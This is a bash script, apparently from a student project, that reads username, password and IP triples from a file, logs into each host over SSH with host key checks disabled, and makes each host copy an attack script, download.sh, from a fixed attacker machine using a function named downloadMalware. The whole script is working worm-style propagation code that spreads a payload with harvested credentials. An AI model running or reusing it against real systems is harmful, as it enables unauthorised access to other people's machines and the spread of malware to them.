##!/bin/bash -x

Red=$'\e[1;31m'
Green=$'\e[1;32m'
Blue=$'\e[1;34m'
Yellow=$'\e[1;33m'
Reset=$'\e[0;m'


login () { #pass, user, ip
	echo "$Blue Trying to login $2... $Reset"
	sshpass -p "$1" ssh -o "StrictHostKeyChecking no" -t -t "$2"@"$3" -p 22  &
	sleep 1

#	sshpass -p "$1" ssh -o "StrictHostKeyChecking no"  "$2"@"$3" "$(declare -f installsshpass "$1");installsshpass "$1""
	sshpass -p "$1" ssh -o "StrictHostKeyChecking no" "$2"@"$3" "$(declare -f createPath);createPath "

	sshpass -p "$1" ssh -o "StrictHostKeyChecking no" "$2"@"$3" "$(declare -f downloadMalware "$1"  "$2");downloadMalware "$1" "$2""

}

#installsshpass () {
#	echo "$Blue Installing sshpass ... $Reset"
#	#echo "$1" | sudo -S apt-get update
#	echo "$1" | sudo -S apt-get install sshpass
#
#	if [$? -eq 0];
#		then
#			echo "$Yellow ##################################################### $Reset"
#			echo "$Green sshpass is installed !!! $Reset"
#			echo "$Yellow ##################################################### $Reset"
#		else
#			echo "$Red sshpass is not installed. May be already installed.!!! $Reset"
#	fi
#}

createPath () {
	echo "$Blue Creating directory to download... $Reset"
	mkdir /home/fyp
	if [$? -eq 0];
		then
			echo "$Yellow ##################################################### $Reset"
			echo "$Green Directory created!!! $Reset"
			echo "$Yellow ##################################################### $Reset"
		else
			echo "$Red Directory is not created. May be already exist.!!! $Reset"
	fi
}

downloadMalware () {
	echo "$Blue Downloading ... $Reset"
	echo "$1" | sshpass -p abcd scp -o "StrictHostKeyChecking no" root@172.24.4.230:/root/attack/download.sh /home/fyp
	if [$? -eq 0];
		then
			echo "$Yellow ##################################################### $Reset"
			echo "$Green Successfully downloaded!!! $Reset"
			echo "$Yellow ##################################################### $Reset"
		else
			echo "$Red Download failed. $Reset"
	fi
}


while read -r line;
do
	IFS=" " read -ra ADDR <<<"$line"

	for i in "${ADDR[0]}";
	do
	USER="$i"
	done

	for i in "${ADDR[1]}";
	do
	PASS="$i"
	done

	for i in "${ADDR[2]}";
	do
	IP="$i"
	done

	login $PASS $USER $IP &


done < output.txt
exit
